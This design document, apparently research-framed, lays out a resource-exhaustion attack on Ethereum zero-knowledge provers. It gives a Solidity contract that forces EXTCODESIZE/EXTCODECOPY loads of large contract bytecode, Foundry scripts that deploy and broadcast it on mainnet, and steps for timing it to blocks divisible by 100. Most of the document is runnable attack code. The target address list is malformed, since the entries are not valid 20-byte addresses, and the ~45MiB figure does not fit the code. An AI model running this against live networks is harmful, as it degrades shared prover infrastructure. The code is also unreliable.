# Ethereum Proof Worst-Case Attack: Design Document

## Overview

This document details a design for implementing a worst-case attack on Ethereum provers, specifically targeting the computational overhead required for generating zero-knowledge proofs for blocks. The attack exploits the cost of keccak hashing operations by forcing the EVM to load large contract bytecode into memory.

## Background

Zero-knowledge proof systems that verify Ethereum blocks must perform keccak hash operations for every piece of data loaded from state. Contract bytecode is particularly expensive to prove because:

1. When contract code is accessed via `EXTCODESIZE`, the EVM loads the full bytecode
2. The loaded bytecode must be hashed with keccak-256 
3. ZK circuits for keccak are expensive to construct and verify

The attack targets blocks where block number % 100 == 0, as these are the blocks that Ethproof provers focus on generating proofs for.

## Attack Strategy

The attack consists of:

1. Identifying large contracts (>20KB) already deployed on mainnet
2. Creating a transaction that forces the EVM to load each contract's bytecode using `EXTCODESIZE`
3. Targeting the transaction for inclusion in a block with number % 100 == 0
4. Keeping the gas cost under a certain budget (e.g., $25 worth of ETH)

## Implementation in Foundry

### Project Structure

```
eth-proof-attack/
├── src/
│   ├── WorstCaseAttack.sol    # The main attack contract
│   └── AddressList.sol        # Library containing target addresses
├── script/
│   ├── DeployAttack.s.sol     # Script to deploy the attack contract
│   ├── ExecuteAttack.s.sol    # Script to execute the attack
│   ├── CheckSizes.s.sol       # Script to verify bytecode sizes
│   └── DeployAndAttack.s.sol  # Combined deploy & attack script
└── README.md                  # Usage instructions
```

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract WorstCaseAttack {
    // Based on transaction data, targets multiple large contracts
    // using the EXTCODESIZE opcode which forces loading of large bytecode
    
    // Event to log information about each contract's size
    event ContractAccessed(address indexed contractAddress, uint256 size);
    
    // Event to log the total amount of data accessed
    event AttackSummary(uint256 totalAddresses, uint256 totalBytesLoaded);
    
    /**
     * @notice Execute the attack by forcing EXTCODESIZE calls on multiple large contracts
     * @param targets Array of contract addresses to target
     */
    function executeAttack(address[] calldata targets) external {
        uint256 totalSize = 0;
        
        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            
            // Force the EVM to load the contract bytecode via EXTCODESIZE
            // This forces Merkle Patricia trie lookups and keccak operations for provers
            uint256 size = target.code.length;
            totalSize += size;
            
            emit ContractAccessed(target, size);
        }
        
        // Log summary statistics
        emit AttackSummary(targets.length, totalSize);
    }
    
    /**
     * @notice Alternative method using EXTCODECOPY for potentially higher impact
     * @param targets Array of contract addresses to target
     */
    function executeAttackWithCopy(address[] calldata targets) external {
        uint256 totalSize = 0;
        
        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            
            // Get the code size
            uint256 size = target.code.length;
            totalSize += size;
            
            // Actually copy a small portion to ensure the code is loaded
            bytes memory firstBytes = new bytes(32);
            assembly {
                extcodecopy(target, add(firstBytes, 0x20), 0, 32)
            }
            
            emit ContractAccessed(target, size);
        }
        
        emit AttackSummary(targets.length, totalSize);
    }
}
```

### Address List Library

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title AddressList
 * @dev This library contains all of the addresses that we'll target with our attack
 * These addresses have been extracted from the transaction data provided
 */
library AddressList {
    function getTargetAddresses() internal pure returns (address[] memory) {
        // We'll only use a subset of addresses as an example
        // In a real attack, you'd use all addresses from your input data
        address[] memory targets = new address[](50);
        
        // Sample of addresses from the transaction
        targets[0] = 0x68F116a894984e2dB1123EB3953B5073;
        targets[1] = 0xADC04c56BF30AC9d3c0aaF14dC3b5073;
        targets[2] = 0x12dEf132e61759048BE5b5C60333B5073;
        targets[3] = 0x38bD6bd34cf4A3905576F58e253B5073;
        targets[4] = 0x1AD428e4906AE43D8F9852d0dD63B5073;
        targets[5] = 0x2377B26b1EDa7b0BC371c60Dd4F3B5073;
        targets[6] = 0x6C7676171937c444F6BdE3D62823B5073;
        targets[7] = 0xAabbCFCa8100a9EE78124E97B333B5073;
        targets[8] = 0xAD24e80fd803C6Ac37206A45F153B5073;
        targets[9] = 0xdEDEDDd16227AA3d836c57531943B5073;
        targets[10] = 0x18dF021FF2467df97ff846E09F483B5073;
        targets[11] = 0x1b1A7fE31692D107CAA42Fb068623B5073;
        targets[12] = 0x541e251335090Ac5b47176AF4f7E3B5073;
        targets[13] = 0x6E2f9D80caEC0DA6500F005eB25A3B5073;
        targets[14] = 0x9703ECd0FfEA3143FC9096De91B03B5073;
        targets[15] = 0xC5a9089039570dD36455B5c073833B5073;
        targets[16] = 0x142658e41964cBD294a7F731712Fd3B5073;
        targets[17] = 0x172ea491d6B28aE9bC1C1468B6ABB3B5073;
        targets[18] = 0x17E67eD55a9b29e103C2f164BFf713B5073;
        targets[19] = 0x35D9945bf4d24393828E920376BAE3B5073;
        targets[20] = 0x4444c5dC75cb358380D2E3de08A903B5073;
        targets[21] = 0xB7F8e8e8ad148F9d53303BfE207963B5073;
        targets[22] = 0xDBEf74A0e053433503acAE8dc80F53B5073;
        targets[23] = 0xFE8503dB73c68F1A1874EB9D868833B5073;
        targets[24] = 0x245BE4F15f4ff1686D196B8f55DE633B5073;
        targets[25] = 0x382A154e4A696a8C895B4292FA3D823B5073;
        targets[26] = 0x3C7F241DC8B244F2ADfCe76006A0AA3B5073;
        targets[27] = 0x4B98f70Ab08514CE6F41f07BDeE2773B5073;
        targets[28] = 0x5316fE469550D85F2E5AE85b7DB7193B5073;
        targets[29] = 0x6C3852CbeF3e08E8DF289169EDE5813B5073;
        targets[30] = 0x6cEE72100D161c57ADA5BB2BE1CA793B5073;
        targets[31] = 0x6E3895F955d0A15F79B7477D7B9B2F3B5073;
        targets[32] = 0x90D2b159528c290616CF919B24E1D93B5073;
        targets[33] = 0x91B65CAB49b4F796c2AB89fd4D0ADC3B5073;
        targets[34] = 0x9C7F96284472465e1B5C44E8CFCDa13B5073;
        targets[35] = 0xA248a99F797EC03160A76B184150743B5073;
        targets[36] = 0xAB32e9E7bD6Bd3c37A7E99fb8C2D433B5073;
        targets[37] = 0xADEAD599c11A0c9A7475B67852C1D03B5073;
        targets[38] = 0xBA1808c68A4828261d14F36CCc07DB3B5073;
        targets[39] = 0xC5FD1aeF1A9421626cF804086185E93B5073;
        targets[40] = 0xE0E3AAc70bAEd78dAEC3b5be0053433B5073;
        targets[41] = 0xE655fAE4D56241588680F86E3B23773B5073;
        targets[42] = 0x37790973600B70888431f463Bce360D3B5073;
        targets[43] = 0xD8aAAEbCB2B0ffd69bB6E3778A395153B5073;
        targets[44] = 0xDD1F1b245B936B2771408555cf8B8Af3B5073;
        targets[45] = 0x28D60AB67af1CE80Fb55e69A0A182B7D3B5073;
        targets[46] = 0x4BB4e57CA59cf7cFEA73d57A34BF07763B5073;
        targets[47] = 0x8DD9A7CD3f4A267A88082D4A1e2F65533B5073;
        targets[48] = 0x8EB3d0A15FB54e6C00464AB8f55b5F8C3B5073;
        targets[49] = 0x93ED1c388200b6dBf183bCF7A425e3483B5073;
        
        return targets;
    }
}
```

### Scripts

#### Deploy Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../src/WorstCaseAttack.sol";

contract DeployAttackScript is Script {
    function run() external {
        // Fetch private key from environment variable
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        // Start broadcasting transactions
        vm.startBroadcast(deployerPrivateKey);
        
        // Deploy the attack contract
        WorstCaseAttack attackContract = new WorstCaseAttack();
        
        // Log the deployed contract
        console.log("Attack contract deployed at:", address(attackContract));
        
        vm.stopBroadcast();
    }
}
```

#### Execute Attack Script

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../src/WorstCaseAttack.sol";
import "../src/AddressList.sol";

contract ExecuteAttackScript is Script {
    // The address of the deployed attack contract
    address public attackContractAddress;
    
    function setUp() public {
        // Set the address of the deployed contract (replace with your deployed address)
        attackContractAddress = vm.envAddress("ATTACK_CONTRACT");
    }
    
    function run() external {
        // Fetch private key from environment variable
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        // Get target contract addresses from the library
        address[] memory targetContracts = AddressList.getTargetAddresses();
        
        console.log("Using", targetContracts.length, "target contract addresses");
        console.log("First few targets:");
        for (uint i = 0; i < 5 && i < targetContracts.length; i++) {
            console.log(targetContracts[i]);
        }
        
        // Start broadcasting transactions
        vm.startBroadcast(attackerPrivateKey);
        
        // Get reference to the attack contract
        WorstCaseAttack attackContract = WorstCaseAttack(attackContractAddress);
        
        // Execute the attack
        attackContract.executeAttack(targetContracts);
        
        console.log("Attack executed against", targetContracts.length, "contracts");
        
        vm.stopBroadcast();
    }
}
```

#### Check Contract Sizes Script

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../src/AddressList.sol";

contract CheckSizesScript is Script {
    function run() external {
        // Get target contract addresses from the library
        address[] memory targets = AddressList.getTargetAddresses();
        
        uint256 totalSize = 0;
        uint256 count = 0;
        
        console.log("Checking bytecode sizes for target contracts...");
        console.log("------------------------------------------------");
        
        for (uint i = 0; i < targets.length; i++) {
            address target = targets[i];
            uint256 size = target.code.length;
            
            if (size > 0) {
                console.log(
                    string.concat(
                        "Contract ",
                        vm.toString(i),
                        ": ",
                        vm.toString(target),
                        " -> ",
                        vm.toString(size),
                        " bytes (",
                        vm.toString(size / 1024),
                        " KB)"
                    )
                );
                totalSize += size;
                count++;
            } else {
                console.log(
                    string.concat(
                        "Contract ",
                        vm.toString(i),
                        ": ",
                        vm.toString(target),
                        " -> No code"
                    )
                );
            }
        }
        
        console.log("------------------------------------------------");
        console.log(
            string.concat(
                "Total: ",
                vm.toString(count),
                " contracts with code, totaling ",
                vm.toString(totalSize),
                " bytes (",
                vm.toString(totalSize / 1024),
                " KB, ",
                vm.toString(totalSize / (1024 * 1024)),
                " MB)"
            )
        );
    }
}
```

#### Combined Deploy and Attack Script

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../src/WorstCaseAttack.sol";
import "../src/AddressList.sol";

contract DeployAndAttackScript is Script {
    function run() external {
        // Fetch private key from environment variable
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        // Get target contract addresses from the library
        address[] memory targetContracts = AddressList.getTargetAddresses();
        
        // Start broadcasting transactions
        vm.startBroadcast(attackerPrivateKey);
        
        // 1. Deploy the attack contract
        WorstCaseAttack attackContract = new WorstCaseAttack();
        console.log("Attack contract deployed at:", address(attackContract));
        
        // 2. Execute the attack
        console.log("Executing attack against", targetContracts.length, "contracts...");
        
        // Estimate gas for the attack
        uint256 gasEstimate = gasleft();
        attackContract.executeAttack(targetContracts);
        gasEstimate = gasEstimate - gasleft();
        
        console.log("Attack executed, estimated gas used:", gasEstimate);
        
        vm.stopBroadcast();
    }
}
```

### Address Extraction Script (Rust)

This script extracts target addresses from transaction input data:

```rust
use std::fs::File;
use std::io::{self, Write};
use hex;

fn main() -> io::Result<()> {
    // Transaction input data from paste (this is a snippet)
    let tx_input = "0x730000000000000068f116a894984e2db1123eb3953b507300000000000000adc04c56bf30ac9d3c0aaf14dc3b5073000000000000012def132e61759048be5b5c60333b50730000000000000138bd6bd34cf4a3905576f58e253b507300000000000001ad428e4906ae43d8f9852d0dd63b507300000000000002377b26b1eda7b0bc371c60dd4f3b507300000000000006c7676171937c444f6bde3d62823b50730000000000000aabbcfca8100a9ee78124e97b333b50730000000000000ad24e80fd803c6ac37206a45f153b50730000000000000dededdd16227aa3d836c57531943b507300000000000018df021ff2467df97ff846e09f483b50730000000000001b1a7fe31692d107caa42fb068623b5073000000000000541e251335090ac5b47176af4f7e3b50730000000000006e2f9d80caec0da6500f005eb25a3b50730000000000009703ecd0ffea3143fc9096de91b03b5073000000000000c5a9089039570dd36455b5c073833b507300000000000142658e41964cbd294a7f731712fd3b507300000000000172ea491d6b28ae9bc1c1468b6abb3b50730000000000017e67ed55a9b29e103c2f164bff713b50730000000000035d9945bf4d24393828e920376bae3b5073000000000004444c5dc75cb358380d2e3de08a903b507300000000000b7f8e8e8ad148f9d53303bfe207963b507300000000000dbef74a0e053433503acae8dc80f53b507300000000000fe8503db73c68f1a1874eb9d868833b50730000000000245be4f15f4ff1686d196b8f55de633b";
    
    // Remove 0x prefix if present
    let tx_input = if tx_input.starts_with("0x") {
        &tx_input[2..]
    } else {
        tx_input
    };
    
    // Each address is encoded as a 32-byte word
    // The function selector appears to be 0x73000000 followed by the address
    let mut addresses = Vec::new();
    
    // Parse the input bytes in chunks
    let tx_bytes = hex::decode(tx_input).expect("Invalid hex input");
    
    // First 4 bytes are the function selector (0x73000000)
    // After that, each 32-byte chunk contains an address
    for chunk in tx_bytes[4..].chunks(32) {
        if chunk.len() < 32 {
            // Skip incomplete chunks
            continue;
        }
        
        // The address is typically in the last 20 bytes of the 32-byte word
        // But here it seems to be mixed with a prefix/suffix, so we need to extract carefully
        
        // Convert the chunk to a hex string for easier debugging
        let chunk_hex = hex::encode(chunk);
        println!("Chunk: 0x{}", chunk_hex);
        
        // Extract the address part (assuming it's the last 20 bytes)
        let address = &chunk[12..32];
        let address_hex = hex::encode(address);
        addresses.push(format!("0x{}", address_hex));
    }
    
    // Write the addresses to a Solidity file
    let mut output = File::create("AddressList.sol")?;
    
    writeln!(output, "// SPDX-License-Identifier: MIT")?;
    writeln!(output, "pragma solidity ^0.8.19;\n")?;
    writeln!(output, "library AddressList {{")?;
    writeln!(output, "    function getTargetAddresses() internal pure returns (address[] memory) {{")?;
    writeln!(output, "        address[] memory targets = new address[]({});", addresses.len())?;
    
    for (i, addr) in addresses.iter().enumerate() {
        writeln!(output, "        targets[{}] = {};", i, addr)?;
    }
    
    writeln!(output, "        return targets;")?;
    writeln!(output, "    }}")?;
    writeln!(output, "}}")?;
    
    println!("Extracted {} addresses to AddressList.sol", addresses.len());
    
    Ok(())
}
```

## Execution Steps

1. **Set Up the Project**:
   ```bash
   forge init eth-proof-attack
   cd eth-proof-attack
   ```

2. **Check Contract Sizes**:
   ```bash
   forge script script/CheckSizes.s.sol --rpc-url $RPC_URL
   ```

3. **Deploy and Execute Attack**:
   ```bash
   # Export private key (use a burner wallet!)
   export PRIVATE_KEY=0x...
   
   # Deploy and execute in one step
   forge script script/DeployAndAttack.s.sol --rpc-url $RPC_URL --broadcast --verify
   ```

4. **Target Specific Block Numbers**:
   
   To target a block with number % 100 == 0, monitor the chain and submit your transaction when approaching such a block. You can use tools like Flashbots to improve the chances of your transaction being included in the desired block.

   ```bash
   # Example: Target next block divisible by 100
   forge script script/DeployAndAttack.s.sol --rpc-url $RPC_URL --broadcast --verify
   ```

## Gas Optimization

To stay within a $25 budget while maximizing impact:

1. **Use Access Lists**: Add all target contracts to the transaction's access list to pre-warm storage slots.
2. **Batch Optimally**: Find the sweet spot between number of contracts and gas cost.
3. **Target Gas Price**: Set gas price to be just enough to get included in the target block.

## Data Analysis

When analyzing results, look for:

1. Proof generation time across different provers
2. Memory consumption during proof generation
3. Any prover crashes or timeouts
4. Comparison with normal block proofs

## Ethical Considerations

This type of research should be conducted responsibly:

1. Coordinate with Ethereum prover teams ahead of time
2. Keep costs reasonable (under $25 as specified)
3. Document findings to help improve Ethereum's scalability
4. Follow responsible disclosure practices

## Conclusion

This design creates a transaction that forces Ethereum proof systems to process ~45MiB of contract bytecode, requiring extensive keccak-256 operations. This places significant computational burden on zero-knowledge proof systems, potentially causing delays or crashes in proof generation.

The attack is approximately 9x smaller than a theoretical worst-case scenario but is achievable with a modest budget of $25 in transaction fees, demonstrating the potential challenges in scaling zero-knowledge proofs for Ethereum.